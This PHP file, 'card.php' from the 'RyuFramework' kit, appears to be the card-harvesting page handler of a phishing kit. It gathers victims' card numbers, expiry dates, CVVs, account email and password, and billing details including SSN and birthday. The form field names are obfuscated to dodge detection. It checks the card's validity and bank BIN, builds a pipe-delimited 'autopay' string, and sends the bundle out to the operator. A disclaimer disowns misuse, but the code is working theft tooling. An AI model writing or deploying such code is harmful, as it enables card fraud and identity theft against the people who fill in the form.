<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:25 )
* @filename card.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
/*** LOG CONFIG FOR STATS ***/
$continue = $this->router('card')['short'];
$type_log = 'card';
$desc_log  = 'User fill card form';
////////////////////////////

/**** SENDING CONFIG ***/
$type_send = 'card';
$subject_send ='';
$form_send = '';
////////////////////////


if($this->getPost())
{
    $data = [];

    /** ACCOUNT **/
    $data['username'] = $this->handler->session('account')['email'];
    $data['password'] = $this->handler->session('account')['password'];

    /** CARD **/
    $cardnumber = $this->getPost()['nomartu'];
    $data['cardnumber'] = $cardnumber; 

    
    $exp_month = $this->getPost()['onth'];
    $data['exp_month'] = $exp_month; 

    
    $exp_year = $this->getPost()['ear'];
    $data['exp_year'] = $exp_year; 

    $data['expired'] = $exp_month."/".$exp_year;

    $cvv = $this->getPost()['cVv'];
    $data['cvv'] = $cvv; 

    
    $cardholder = $this->getPost()['carlder'];
    $data['cardholder'] = $cardholder; 

    /** BILLING **/
    $fullname = $this->handler->session('billing')['fullname'];
    $data['fullname'] = $fullname; 

    
    $address = $this->handler->session('billing')['address'];
    $data['address'] = $address; 

    
    $city = $this->handler->session('billing')['city'];
    $data['city'] = $city; 

    
    $state = $this->handler->session('billing')['state'];
    $data['state'] = $state; 

    
    $postcode = $this->handler->session('billing')['postcode'];
    $data['postcode'] = $postcode; 

    
    $country = $this->handler->session('billing')['country'];
    $data['country'] = $country; 

    
    $phone = $this->handler->session('billing')['phone'];
    $data['phone'] = $phone; 
    $ssn = $this->handler->session('billing')['ssn'];
    $data['ssn'] = $ssn;
    
    $birthday = $this->handler->session('billing')['birthday'];
    $data['birthday'] = $birthday; 
    
     
$apay = str_replace(" ","",trim($this->handler->post('nomartu')))."|".$this->handler->post('onth')."|".$this->handler->post('ear')."|".$this->handler->post('cVv');
    $copy = $apay."|".$this->handler->post('carlder')."|".$data['address']."|".$data['city']."|".$data['state']."|".$data['postcode']."|".$this->userdata['country']['countryCode']."|".$data['phone'];

   
   if($this->api->trueCard($copy) == false)
   {
     $this->handler->_session('card_not_valid',true);
    return $this->redirect($this->router('billing')['full']);
  
   }
     /** bin checker */
     $num = $this->handler->post('nomartu');
     $num = preg_replace('/\s/', '', $num);
     $num = substr($num,0,6);

     $bin = $this->api->getBin($num);
     /** end bin checker */
     
     /** BINS **/
     $data['bank'] = $bin['bank'];
     $data['brandtype'] = $bin['brand'].' - '.$bin['type'];
     $data['levelcountry'] = $bin['level'].' - '.$bin['country'];
    $data['cid'] = $this->handler->post('cid');
    $data['copy'] = $apay;
    $data['autopay'] = $copy;

     if($this->handler->check_session('double_card_page'))
     {
         if($this->handler->session('card')['cardnumber'] == $this->handler->post('nomartu'))
         {
             toLogs('card-double',['data' => ['country' => $this->userdata['country']['country'],
             'device' => $this->handler->detection()['platform'],
             'ip' => $this->handler->detection()['userip'],
             'browser' => $this->handler->detection()['browser']
             ],
     'desc' => 'double card is not sent because the new card is the same as the old card'] );
               return $this->redirect($this->router('card')['full']);
         }
     }

        $subject_send = "[".$num."][CARD] ".$bin['brand']." ".$bin['type']." ".$bin['level']." ".$bin['bank']." ".$bin['country'];
        $form_send = $data['fullname'];
        $send = ['from' => $form_send,
                'subject' => $subject_send,
                'type' => $type_send,
                'data' => $data
            ];

        $log = ['type' => $type_log,
                'desc' => $desc_log
            ];


        return $this->send($send,$log,$continue);
 
}
